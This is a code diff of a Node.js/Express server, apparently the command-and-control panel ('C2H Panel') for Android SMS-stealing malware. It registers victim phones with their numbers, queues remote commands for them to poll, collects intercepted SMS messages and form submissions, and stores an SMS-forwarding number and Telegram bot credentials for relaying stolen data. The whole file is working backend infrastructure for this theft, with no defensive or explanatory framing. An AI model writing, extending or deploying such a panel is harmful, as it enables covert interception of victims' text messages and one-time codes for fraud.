@@ -1,240 +1,314 @@
-// ✅ SIMPLE WORKING SERVER
-let devices = [];
-let settings = {};
+const express = require('express');
+const cors = require('cors');
+const Database = require('better-sqlite3');
+const path = require('path');
 
-export default async function handler(req, res) {
-  // ✅ FIX: Always set response headers FIRST
-  res.setHeader('Content-Type', 'application/json');
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  
-  // ✅ Handle OPTIONS for CORS
-  if (req.method === 'OPTIONS') {
-    res.statusCode = 200;
-    res.end();
-    return;
-  }
-  
-  const { url, method } = req;
-  
-  try {
-    // ✅ Parse request body
-    let body = {};
-    if (method === 'POST' || method === 'PUT') {
-      const chunks = [];
-      for await (const chunk of req) {
-        chunks.push(chunk);
-      }
-      const buffer = Buffer.concat(chunks);
-      if (buffer.length > 0) {
-        try {
-          body = JSON.parse(buffer.toString());
-        } catch (e) {
-          console.log('JSON parse error:', e.message);
+const app = express();
+
+// Middleware
+app.use(cors());
+app.use(express.json());
+
+// Database setup (Vercel uses /tmp for writable storage)
+const dbPath = process.env.VERCEL ? '/tmp/c2h_panel.db' : './c2h_panel.db';
+const db = new Database(dbPath);
+
+// Initialize database
+function initDB() {
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS devices (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT UNIQUE NOT NULL,
+            device_name TEXT,
+            os_version TEXT,
+            phone_number TEXT,
+            battery_level INTEGER,
+            last_seen DATETIME NOT NULL,
+            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
+        );
+
+        CREATE TABLE IF NOT EXISTS commands (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT NOT NULL,
+            command_type TEXT NOT NULL,
+            command_data TEXT NOT NULL,
+            status TEXT NOT NULL DEFAULT 'pending',
+            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
+        );
+
+        CREATE TABLE IF NOT EXISTS sms_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT NOT NULL,
+            sender TEXT NOT NULL,
+            message_body TEXT NOT NULL,
+            received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
+        );
+
+        CREATE TABLE IF NOT EXISTS form_submissions (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT NOT NULL,
+            custom_data TEXT NOT NULL,
+            submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
+        );
+
+        CREATE TABLE IF NOT EXISTS global_settings (
+            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
+            setting_value TEXT
+        );
+    `);
+    console.log('✅ Database initialized');
+}
+
+initDB();
+
+// FEATURE 1: Device Registration
+app.post('/api/device/register', (req, res) => {
+    try {
+        const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
+        
+        if (!device_id) {
+            return res.status(400).json({ status: 'error', message: 'device_id required' });
         }
-      }
+        
+        const last_seen = new Date().toISOString();
+        const existing = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);
+
+        if (existing) {
+            db.prepare(`UPDATE devices SET device_name = ?, os_version = ?, phone_number = ?, 
+                battery_level = ?, last_seen = ? WHERE device_id = ?`)
+                .run(device_name, os_version, phone_number, battery_level, last_seen, device_id);
+            console.log('✅ Updated:', device_id);
+        } else {
+            db.prepare(`INSERT INTO devices (device_id, device_name, os_version, phone_number, 
+                battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)`)
+                .run(device_id, device_name, os_version, phone_number, battery_level, last_seen, last_seen);
+            console.log('✅ New device:', device_id);
+        }
+
+        res.json({ status: 'success', message: 'Device data received and updated.' });
+    } catch (error) {
+        console.error('❌ Error:', error);
+        res.status(500).json({ status: 'error', message: error.message });
     }
-    
-    // ✅ API ENDPOINTS
-    const now = () => new Date().toISOString();
-    
-    // 1. DEVICE REGISTER
-    if (url === '/api/device/register' && method === 'POST') {
-      const { device_id, device_name, os_version, battery_level, phone_number } = body;
-      const currentTime = now();
-      
-      const index = devices.findIndex(d => d.device_id === device_id);
-      
-      if (index > -1) {
-        devices[index] = {
-          ...devices[index],
-          device_name: device_name || devices[index].device_name,
-          os_version: os_version || devices[index].os_version,
-          phone_number: phone_number || devices[index].phone_number,
-          battery_level: battery_level || devices[index].battery_level,
-          last_seen: currentTime
-        };
-      } else {
-        devices.push({
-          device_id,
-          device_name: device_name || 'Unknown',
-          os_version: os_version || 'Unknown',
-          phone_number: phone_number || 'N/A',
-          battery_level: battery_level || 0,
-          last_seen: currentTime,
-          created_at: currentTime
+});
+
+// FEATURE 2: Get Devices
+app.get('/api/devices', (req, res) => {
+    try {
+        const rows = db.prepare('SELECT * FROM devices ORDER BY created_at ASC').all();
+        const currentTime = new Date();
+        
+        const devices = rows.map(device => {
+            const lastSeen = new Date(device.last_seen);
+            const timeDiff = (currentTime - lastSeen) / 1000;
+            const is_online = timeDiff < 20;
+
+            return {
+                device_id: device.device_id,
+                device_name: device.device_name,
+                os_version: device.os_version,
+                phone_number: device.phone_number,
+                battery_level: device.battery_level,
+                is_online: is_online,
+                created_at: device.created_at
+            };
         });
-      }
-      
-      return res.end(JSON.stringify({ status: 'success' }));
+
+        res.json(devices);
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
     }
-    
-    // 2. GET DEVICES
-    if (url === '/api/devices' && method === 'GET') {
-      const result = devices.map(device => ({
-        device_id: device.device_id,
-        device_name: device.device_name,
-        os_version: device.os_version,
-        phone_number: device.phone_number,
-        battery_level: device.battery_level,
-        last_seen: device.last_seen,
-        created_at: device.created_at,
-        is_online: (Date.now() - new Date(device.last_seen).getTime()) < 20000
-      }));
-      
-      return res.end(JSON.stringify(result));
+});
+
+// FEATURE 3: Update SMS Forward
+app.post('/api/config/sms_forward', (req, res) => {
+    try {
+        const { forward_number } = req.body;
+        db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
+            VALUES ('sms_forward_number', ?)`).run(forward_number);
+        res.json({ status: 'success', message: 'Forwarding number updated successfully.' });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
     }
-    
-    // 3. DELETE DEVICE
-    if (url.startsWith('/api/device/') && method === 'DELETE') {
-      const deviceId = url.split('/')[3];
-      devices = devices.filter(d => d.device_id !== deviceId);
-      return res.end(JSON.stringify({ status: 'success' }));
+});
+
+// FEATURE 4: Get SMS Forward
+app.get('/api/config/sms_forward', (req, res) => {
+    try {
+        const row = db.prepare('SELECT setting_value FROM global_settings WHERE setting_key = ?')
+            .get('sms_forward_number');
+        res.json({ forward_number: row ? row.setting_value : null });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
     }
-    
-    // 4. SMS FORWARD NUMBER
-    if (url === '/api/config/sms_forward') {
-      if (method === 'POST') {
-        settings.sms_forward_number = body.forward_number || '';
-        return res.end(JSON.stringify({ status: 'success' }));
-      }
-      if (method === 'GET') {
-        return res.end(JSON.stringify({ 
-          forward_number: settings.sms_forward_number || '' 
+});
+
+// FEATURE 5: Telegram Config
+app.post('/api/config/telegram', (req, res) => {
+    try {
+        const { telegram_bot_token, telegram_chat_id } = req.body;
+        db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
+            VALUES ('telegram_bot_token', ?)`).run(telegram_bot_token);
+        db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
+            VALUES ('telegram_chat_id', ?)`).run(telegram_chat_id);
+        res.json({ status: 'success', message: 'Telegram details updated successfully.' });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+app.get('/api/config/telegram', (req, res) => {
+    try {
+        const rows = db.prepare(`SELECT * FROM global_settings 
+            WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')`).all();
+        
+        const result = {};
+        rows.forEach(row => {
+            result[row.setting_key] = row.setting_value;
+        });
+        
+        res.json({
+            telegram_bot_token: result.telegram_bot_token || null,
+            telegram_chat_id: result.telegram_chat_id || null
+        });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+// FEATURE 6: Send Command
+app.post('/api/command/send', (req, res) => {
+    try {
+        const { device_id, command_type, command_data } = req.body;
+        db.prepare(`INSERT INTO commands (device_id, command_type, command_data, status) 
+            VALUES (?, ?, ?, 'pending')`).run(device_id, command_type, JSON.stringify(command_data));
+        res.json({ status: 'success', message: 'Command queued successfully.' });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+// Get Commands
+app.get('/api/device/:deviceId/commands', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const rows = db.prepare(`SELECT * FROM commands WHERE device_id = ? AND status = 'pending'`)
+            .all(deviceId);
+
+        if (rows.length > 0) {
+            const commandIds = rows.map(r => r.id);
+            const placeholders = commandIds.map(() => '?').join(',');
+            db.prepare(`UPDATE commands SET status = 'sent' WHERE id IN (${placeholders})`)
+                .run(...commandIds);
+        }
+
+        const commands = rows.map(cmd => ({
+            id: cmd.id,
+            command_type: cmd.command_type,
+            command_data: cmd.command_data
         }));
-      }
+
+        res.json(commands);
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
     }
-    
-    // 5. TELEGRAM SETTINGS
-    if (url === '/api/config/telegram') {
-      if (method === 'POST') {
-        settings.telegram_bot_token = body.telegram_bot_token || '';
-        settings.telegram_chat_id = body.telegram_chat_id || '';
-        return res.end(JSON.stringify({ status: 'success' }));
-      }
-      if (method === 'GET') {
-        return res.end(JSON.stringify({
-          telegram_bot_token: settings.telegram_bot_token || '',
-          telegram_chat_id: settings.telegram_chat_id || ''
-        }));
-      }
+});
+
+// Execute Command
+app.post('/api/command/:commandId/execute', (req, res) => {
+    try {
+        const { commandId } = req.params;
+        db.prepare(`UPDATE commands SET status = 'executed' WHERE id = ?`).run(commandId);
+        res.json({ status: 'success', message: 'Command marked as executed.' });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
     }
-    
-    // 6. SERVE HTML PANEL
-    if (url === '/' || url === '/index.html') {
-      res.setHeader('Content-Type', 'text/html');
-      
-      const html = `<!DOCTYPE html>
-<html>
-<head>
-    <title>C2H Panel</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { background: #1a1a1a; color: white; padding: 20px; font-family: Arial; }
-        .header { text-align: center; padding: 20px 0; }
-        h1 { color: #3a86ff; }
-        .btn { width: 100%; padding: 15px; margin: 10px 0; background: #3a86ff; color: white; border: none; border-radius: 8px; font-size: 16px; }
-        .btn:hover { background: #2a76ef; }
-        .device { background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #3a86ff; }
-        .online { color: #2ecc71; }
-        .offline { color: #e74c3c; }
-        .delete-btn { background: #e74c3c; color: white; border: none; padding: 5px 10px; float: right; border-radius: 5px; }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>🚀 C2H ADMIN PANEL</h1>
-        <p>✅ Server is working perfectly!</p>
-    </div>
-    
-    <button class="btn" onclick="updateForward()">📞 UPDATE FORWARD NUMBER</button>
-    <button class="btn" onclick="updateTelegram()">🤖 UPDATE TELEGRAM</button>
-    
-    <h3>📱 DEVICES LIST</h3>
-    <div id="deviceList">Loading devices...</div>
-    
-    <script>
-        const API_BASE = window.location.origin;
-        
-        async function loadDevices() {
-            try {
-                const res = await fetch(API_BASE + '/api/devices');
-                const devices = await res.json();
-                
-                let html = '';
-                devices.forEach(device => {
-                    html += \`
-                    <div class="device">
-                        <strong>\${device.device_name}</strong>
-                        <span class="\${device.is_online ? 'online' : 'offline'}">
-                            \${device.is_online ? '🟢 ONLINE' : '🔴 OFFLINE'}
-                        </span>
-                        <button class="delete-btn" onclick="deleteDevice('\${device.device_id}')">DELETE</button>
-                        <br>
-                        📱 ID: \${device.device_id}<br>
-                        🔋 Battery: \${device.battery_level}%<br>
-                        📞 Number: \${device.phone_number}<br>
-                        🕐 Last Seen: \${device.last_seen}
-                    </div>\`;
-                });
-                
-                document.getElementById('deviceList').innerHTML = html || 'No devices found';
-            } catch (error) {
-                document.getElementById('deviceList').innerHTML = 'Error loading devices';
-            }
-        }
-        
-        function updateForward() {
-            const number = prompt('Enter forwarding number:');
-            if (!number) return;
-            
-            fetch(API_BASE + '/api/config/sms_forward', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ forward_number: number })
-            }).then(() => alert('✅ Updated!'));
-        }
-        
-        function updateTelegram() {
-            const token = prompt('Bot Token:');
-            const chatId = prompt('Chat ID:');
-            
-            fetch(API_BASE + '/api/config/telegram', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ telegram_bot_token: token, telegram_chat_id: chatId })
-            }).then(() => alert('✅ Updated!'));
-        }
-        
-        function deleteDevice(deviceId) {
-            if (confirm('Delete this device?')) {
-                fetch(API_BASE + '/api/device/' + deviceId, { 
-                    method: 'DELETE' 
-                }).then(() => loadDevices());
-            }
-        }
-        
-        // Auto refresh
-        setInterval(loadDevices, 3000);
-        loadDevices();
-    </script>
-</body>
-</html>`;
-      
-      return res.end(html);
+});
+
+// FEATURE 7: Forms
+app.post('/api/device/:deviceId/forms', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const { custom_data } = req.body;
+        db.prepare('INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)')
+            .run(deviceId, custom_data);
+        res.json({ status: 'success', message: 'Form data saved.' });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
     }
-    
-    // 7. 404 - Not Found
-    res.statusCode = 404;
-    return res.end(JSON.stringify({ error: 'Not found' }));
-    
-  } catch (error) {
-    console.error('Server error:', error);
-    res.statusCode = 500;
-    return res.end(JSON.stringify({ 
-      error: 'Internal server error',
-      message: error.message 
-    }));
-  }
+});
+
+app.get('/api/device/:deviceId/forms', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const rows = db.prepare('SELECT * FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC')
+            .all(deviceId);
+        res.json(rows);
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+// FEATURE 8: SMS Logs
+app.post('/api/device/:deviceId/sms', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const { sender, message_body } = req.body;
+        db.prepare('INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)')
+            .run(deviceId, sender, message_body);
+        res.json({ status: 'success', message: 'SMS logged.' });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+app.get('/api/device/:deviceId/sms', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const rows = db.prepare('SELECT * FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC')
+            .all(deviceId);
+        res.json(rows);
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+// Delete Device
+app.delete('/api/device/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
+        db.prepare('DELETE FROM sms_logs WHERE device_id = ?').run(deviceId);
+        db.prepare('DELETE FROM form_submissions WHERE device_id = ?').run(deviceId);
+        res.json({ status: 'success', message: 'Device and related data deleted.' });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+// Delete SMS
+app.delete('/api/sms/:smsId', (req, res) => {
+    try {
+        const { smsId } = req.params;
+        db.prepare('DELETE FROM sms_logs WHERE id = ?').run(smsId);
+        res.json({ status: 'success', message: 'SMS deleted.' });
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+// Health check
+app.get('/api/health', (req, res) => {
+    res.json({ status: 'ok', timestamp: new Date().toISOString() });
+});
+
+// For Vercel serverless
+module.exports = app;
+
+// For local testing
+if (require.main === module) {
+    const PORT = process.env.PORT || 3000;
+    app.listen(PORT, () => {
+        console.log(`🚀 Server running on port ${PORT}`);
+    });
 }
